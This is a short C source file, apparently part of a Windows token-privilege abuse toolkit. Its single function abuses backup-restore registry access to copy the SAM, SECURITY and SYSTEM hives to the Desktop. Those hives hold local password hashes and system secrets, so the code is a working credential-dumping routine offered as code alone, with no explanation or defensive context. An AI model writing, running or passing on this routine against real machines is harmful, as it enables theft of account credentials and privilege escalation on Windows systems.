#include "poptoke.h"

void
se_backup_priv_reg()
{
	HKEY handle;
	if (!RegCreateKeyExA(HKEY_LOCAL_MACHINE,
		"SAM",
		0,
		NULL,
		REG_OPTION_BACKUP_RESTORE,
		KEY_SET_VALUE,
		NULL,
		&handle,
		NULL) == ERROR_SUCCESS)
	{
		printf("[-] Failed to open reg; %d\n", GetLastError());
		return;
	}

	if (!RegSaveKey(handle, L"C:\\Users\\USERNAME\\Desktop\\SAM", NULL) == ERROR_SUCCESS){
		printf("[-] Failed to save key: %d\n", GetLastError());
		return;
	}

	RegCloseKey(handle);

	if (!RegCreateKeyExA(HKEY_LOCAL_MACHINE,
		"SECURITY",
		0,
		NULL,
		REG_OPTION_BACKUP_RESTORE,
		KEY_SET_VALUE,
		NULL,
		&handle,
		NULL) == ERROR_SUCCESS)
	{
		printf("Failed to open reg; %d\n", GetLastError());
		return;
	}

	if (!RegSaveKey(handle, L"C:\\Users\\USERNAME\\Desktop\\SECURITY", NULL) == ERROR_SUCCESS){
		printf("[-] Failed to save key: %d\n", GetLastError());
		return;
	}

	RegCloseKey(handle);

	if (!RegCreateKeyExA(HKEY_LOCAL_MACHINE,
		"SYSTEM",
		0,
		NULL,
		REG_OPTION_BACKUP_RESTORE,
		KEY_SET_VALUE,
		NULL,
		&handle,
		NULL) == ERROR_SUCCESS)
	{
		printf("[-] Failed to open reg; %d\n", GetLastError());
		return;
	}

	if (!RegSaveKey(handle, L"C:\\Users\\USERNAME\\Desktop\\SYSTEM", NULL) == ERROR_SUCCESS){
		printf("[-] Failed to save key: %d\n", GetLastError());
		return;
	}

	RegCloseKey(handle);
}